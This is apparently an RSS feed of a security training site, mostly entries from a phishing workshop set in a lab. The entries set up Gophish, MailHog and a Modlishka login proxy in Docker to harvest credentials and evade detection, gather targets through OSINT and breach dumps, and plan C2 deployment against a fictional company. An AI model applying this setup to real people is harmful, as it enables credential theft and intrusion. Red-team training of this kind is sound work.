<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>defektive</title><link>https://defektive.github.io/</link><description>Recent content on defektive</description><generator>Hugo</generator><language>en</language><atom:link href="https://defektive.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Firebase</title><link>https://defektive.github.io/docs/domain-takeovers/05-firebase/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/domain-takeovers/05-firebase/</guid><description>&lt;p&gt;Currently, Firebase protects against domain takeovers by requiring each domain to have a unique CNAME or TXT record on the affected domain.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/domain-takeovers/firebase.png" alt="Firebase DNS Settings"&gt;&lt;/p&gt;</description></item><item><title>Prerequisites</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/05-preqs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/05-preqs/</guid><description>&lt;p&gt;Hopefully this describes you:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Human.&lt;/li&gt;
&lt;li&gt;Proficient with Linux terminal usage.&lt;/li&gt;
&lt;li&gt;Manage / edit files in GUIs and terminals.&lt;/li&gt;
&lt;li&gt;Have a laptop with the following:
&lt;ul&gt;
&lt;li&gt;Ability to run a Linux VM (not required for on site trainings).&lt;/li&gt;
&lt;li&gt;WiFi card.&lt;/li&gt;
&lt;li&gt;A web browser.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Proficient with docker and docker compose.&lt;/li&gt;
&lt;li&gt;Desire to learn, sometimes the hard way (eg: troubleshooting).&lt;/li&gt;
&lt;li&gt;???&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Squarespace</title><link>https://defektive.github.io/docs/domain-takeovers/05-squarespace/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/domain-takeovers/05-squarespace/</guid><description>&lt;p&gt;Currently, Squarespace protects against domain takeovers by requiring each domain to have a unique CNAME record on the affected domain.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/domain-takeovers/squarespace.png" alt="Squarespace DNS Settings"&gt;&lt;/p&gt;</description></item><item><title>Introduction</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/10-introduction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/10-introduction/</guid><description>&lt;p&gt;Setting the stage for things to come.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We are going to setup phishing infrastructure.&lt;/li&gt;
&lt;li&gt;Our infrastructure will allow us to:
&lt;ul&gt;
&lt;li&gt;Manage phishing campaigns (Gophish).&lt;/li&gt;
&lt;li&gt;Send emails (MailHog for testing, ??? for production).&lt;/li&gt;
&lt;li&gt;Coordinate requests between users and a login provider (Modlishka).&lt;/li&gt;
&lt;li&gt;Hide from detections / bots.&lt;/li&gt;
&lt;li&gt;Acquire a CSV of users to target (First Name, Last Name, Email, Role).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Infrastructure</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15.5-infrastructure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15.5-infrastructure/</guid><description>&lt;blockquote&gt;
&lt;p&gt;Skip this section if taking the training. The lab should already have this.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We&amp;rsquo;ll be using a few different VMs throughout this process. Let&amp;rsquo;s kick off the downloads now since they make take some
time to complete.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ubuntu.com/download/desktop/thank-you?version=22.04.2&amp;amp;architecture=amd64"&gt;Ubuntu LTS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.microsoft.com/en-us/software-download/windows10ISO"&gt;Windows 10&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id="op-vm"&gt;Op VM&lt;a class="td-heading-self-link" href="#op-vm" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We need a place to deploy all our stuff. For this workshop, we&amp;rsquo;ll be using VirtualBox and the latest Ubuntu LTS (22.04
LTS). &lt;a href="https://ubuntu.com/tutorials/how-to-run-ubuntu-desktop-on-a-virtual-machine-using-virtualbox#1-overview"&gt;Ubuntu has a great walk through on how to do this&lt;/a&gt;.&lt;/p&gt;</description></item><item><title>What isn't covered?</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15-not-covered/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15-not-covered/</guid><description>&lt;p&gt;These should be considered in real engagements&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Domain reputation.&lt;/li&gt;
&lt;li&gt;Impossible travel detection&amp;rsquo;s.&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Target acquisition.&lt;/del&gt; Lightly covered.&lt;/li&gt;
&lt;li&gt;Designing target specific campaigns.&lt;/li&gt;
&lt;li&gt;??? Probably more&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Lab Environment</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16-lab-connect/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16-lab-connect/</guid><description>&lt;blockquote&gt;
&lt;p&gt;This is for onsite training. Skip this section if not taking training.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id="connect-to-the-lab-network"&gt;Connect to the lab network&lt;a class="td-heading-self-link" href="#connect-to-the-lab-network" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Connecting to the lab environment.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WiFi Name: &lt;code&gt;SaintConPhishingTraining&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;WiFi_Pass: &lt;code&gt;I can haz teh phish now?&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id="sign-in-to-the-lab-environment"&gt;Sign in to the lab environment&lt;a class="td-heading-self-link" href="#sign-in-to-the-lab-environment" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Once connected to the Wi-Fi, open the lab environment URL.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://console.lab.dfktv:8443/#/"&gt;https://console.lab.dfktv:8443/#/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Use your supplied credentials to login.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/guac-login.png" alt="Guacamole Login"&gt;&lt;/p&gt;
&lt;p&gt;You should see two VM connections waiting for you.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/guac-vm-connections.png" alt="Guacamole Connections"&gt;&lt;/p&gt;</description></item><item><title>Lab Environment: Rules of Engagement</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16.5-roe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16.5-roe/</guid><description>&lt;blockquote&gt;
&lt;p&gt;This is for onsite training. Skip this section if not taking training.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;SAINTCON Phishing has been tasked to perform a penetration test against SnakShare&amp;rsquo;s information systems and employees. SnakShare recently implemented new email security protections.&lt;/p&gt;

&lt;h3 id="scope"&gt;Scope&lt;a class="td-heading-self-link" href="#scope" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;snakshare.com and any subdomains&lt;/li&gt;
&lt;li&gt;mail.snakshare.com&lt;/li&gt;
&lt;li&gt;auth.snakshare.com&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id="rules-of-engagement"&gt;Rules of Engagement&lt;a class="td-heading-self-link" href="#rules-of-engagement" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Target email addresses will NOT be supplied.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id="test-plan"&gt;Test Plan&lt;a class="td-heading-self-link" href="#test-plan" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Effektive Ops will conduct the following.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Perform OSINT against SnakShare.&lt;/li&gt;
&lt;li&gt;Compile a list of potential SnakShare employees and email addresses.&lt;/li&gt;
&lt;li&gt;Perform a phishing engagement against discovered employees.
&lt;ul&gt;
&lt;li&gt;Harvest credentials.&lt;/li&gt;
&lt;li&gt;Deploy C2 agent on to victim machines.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Setup Operations Directory</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/20-setup-op-dir/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/20-setup-op-dir/</guid><description>&lt;p&gt;We need a nice place to organize and store everything. For this exercise, we&amp;rsquo;ll use &lt;code&gt;~/Desktop/op&lt;/code&gt;. We&amp;rsquo;ll also need a &lt;code&gt;docker&lt;/code&gt; directory to put our docker configuration in.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir -p ~/Desktop/op/docker
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;touch ~/Desktop/op/docker/docker-compose.yml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>OSINT</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/24-osint/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/24-osint/</guid><description>&lt;p&gt;It is time to perform OSINT on our target&amp;hellip;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;host snakshare.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We should see something like this.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;âžœ ~ host snakshare.com
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;snakshare.com has address 162.255.119.59
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;snakshare.com mail is handled by 10 eforward3.registrar-servers.com.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;snakshare.com mail is handled by 20 eforward5.registrar-servers.com.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;snakshare.com mail is handled by 15 eforward4.registrar-servers.com.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;snakshare.com mail is handled by 10 eforward1.registrar-servers.com.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;snakshare.com mail is handled by 10 eforward2.registrar-servers.com.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I like to do a reverse host look up.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;host 162.255.119.59
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But that gives us nothing&amp;hellip;.&lt;/p&gt;</description></item><item><title>Mailhog</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/25-mailhog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/25-mailhog/</guid><description>&lt;p&gt;MailHog is an SMTP server used for testing various applications that send emails. It provides a simple web interface to view what messages have been sent. Let&amp;rsquo;s edit our new &lt;code&gt;~/Desktop/op/docker/docker-compose.yml&lt;/code&gt; file and add the following to configure MailHog.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-yml" data-lang="yml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;version&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;3&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;span class="nt"&gt;services&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;mailhog&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;mailhog/mailhog&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;container_name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;mailhog&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;environment&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="l"&gt;VIRTUAL_HOST=mailhog.docker&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;logging&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;driver&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;none&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c"&gt;# disable saving logs&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we should be able to bring up our docker compose environment to test that it is working.&lt;/p&gt;</description></item><item><title>Gophish</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/30-gophish/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/30-gophish/</guid><description>&lt;h3 id="gophish"&gt;Gophish&lt;a class="td-heading-self-link" href="#gophish" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Let&amp;rsquo;s create a file for our Gophish configuration:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir -p ~/Desktop/op/docker/gophish
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;touch ~/Desktop/op/docker/gophish/config.json
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="nt"&gt;&amp;#34;admin_server&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;listen_url&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;0.0.0.0:3333&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;use_tls&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;cert_path&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;gophish_admin.crt&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;key_path&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;gophish_admin.key&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;trusted_origins&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="nt"&gt;&amp;#34;phish_server&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;listen_url&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;0.0.0.0:80&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;use_tls&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;cert_path&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;example.crt&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;key_path&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;example.key&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="nt"&gt;&amp;#34;db_name&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;sqlite3&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="nt"&gt;&amp;#34;db_path&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;gophish.db&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="nt"&gt;&amp;#34;migrations_prefix&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;db/db_&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="nt"&gt;&amp;#34;contact_address&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="nt"&gt;&amp;#34;logging&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;filename&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;		&lt;span class="nt"&gt;&amp;#34;level&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;	&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can add Gophish to our docker-compose services.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-yml" data-lang="yml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;gophish&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;gophish/gophish&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;container_name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;gophish&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;environment&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="l"&gt;VIRTUAL_HOST=gophish.docker&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;links&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="s2"&gt;&amp;#34;mailhog&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;volumes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="s2"&gt;&amp;#34;gophish:/opt/gophish&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="s2"&gt;&amp;#34;./gophish/config.json:/opt/gophish/config.json&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, we need to add a Gophish named volume to the end:&lt;/p&gt;</description></item><item><title>Target Acquisition</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/31-target-aquistion/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/31-target-aquistion/</guid><description>&lt;p&gt;Where can we acquire targets?&lt;/p&gt;

&lt;h3 id="linkedin"&gt;LinkedIn&lt;a class="td-heading-self-link" href="#linkedin" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id="pros"&gt;Pros&lt;a class="td-heading-self-link" href="#pros" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Useful job role information.&lt;/li&gt;
&lt;li&gt;Usually up to date.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="cons"&gt;Cons&lt;a class="td-heading-self-link" href="#cons" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Most likely violates LinkedIn policy if automated.&lt;/li&gt;
&lt;li&gt;Automation is brittle and requires updates when changes are made.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id="breach-dumps"&gt;Breach Dumps&lt;a class="td-heading-self-link" href="#breach-dumps" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id="pros-1"&gt;Pros&lt;a class="td-heading-self-link" href="#pros-1" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Could find valid passwords.&lt;/li&gt;
&lt;li&gt;Confirm email address formatting.&lt;/li&gt;
&lt;li&gt;cool services like Dehashed mean you don&amp;rsquo;t have to maintain the data.&lt;/li&gt;
&lt;/ul&gt;

